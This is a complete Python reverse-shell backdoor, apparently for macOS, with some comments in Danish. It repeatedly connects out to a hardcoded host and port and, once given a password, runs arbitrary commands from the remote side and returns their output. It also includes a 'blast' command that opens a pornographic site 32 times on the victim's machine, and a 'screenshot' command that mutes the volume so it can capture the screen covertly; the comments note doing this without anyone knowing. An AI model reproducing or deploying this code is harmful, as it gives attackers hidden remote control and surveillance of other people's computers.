#!/usr/bin/env python
import os
import socket
import subprocess
import time
import getpass
host = ""
port = 44444
password = 'n0tm1ne'
# todo openscource den bare for sjov
# todo popopens

def passwd():
    thetry = ''
    while password != thetry:
        s.send('password pleas: ')
        thetry = str(s.recv(1024)[:-1:])
        if thetry == password:
            shell()
        else:
            s.send('try again \n')


def shell():
    while True:
        s.send('\033[91m' + os.getcwd() + '>> ' + '\033[0m')  # yep i added fucking colors what are you gonna do?
        command = s.recv(1024)[:-1:]      # [:1:] cutter \n af
        if len(command) > 0:
            if command[:8] == 'shutdown':
                s.send('Just reconnect if you want. But bye for now \n')
                s.close()
                break
            elif 'stopnow' == command:
                s.send('Bye \n')
                quit()
               
            elif command[:5] == 'blast':
                blastcnt = 0
                while blastcnt != 32:
                    blast = 'open http://pornhub.com'
                    subprocess.Popen(blast, shell=True)
                    blastcnt += 1

            elif command[:2] == 'cd':
                try:
                    os.chdir(command.split(' ')[1])
                except Exception as e:
                    s.send(str(e))

            elif command[:10] == 'screenshot':
                piccmds = ['osascript -e "set Volume 0"', 'screencapture -x shot.jpg']
                for cmd in piccmds:
                    subprocess.Popen(cmd, shell=True)
                    time.sleep(0.2)   # sover lidt ellers har den ikke nok tid til at skruge ned for den taker billedet
                # TODO faa den til at sende til attacker og slet efter
                # men ind til videre er det en god maade at tage screenshots paa uden nogen ved det
            else:

                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = cmd.stdout.read()+cmd.stderr.read()
                s.send(output)
        else:
            continue


while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
    except Exception:
        continue
    passwd()
    time.sleep(3)
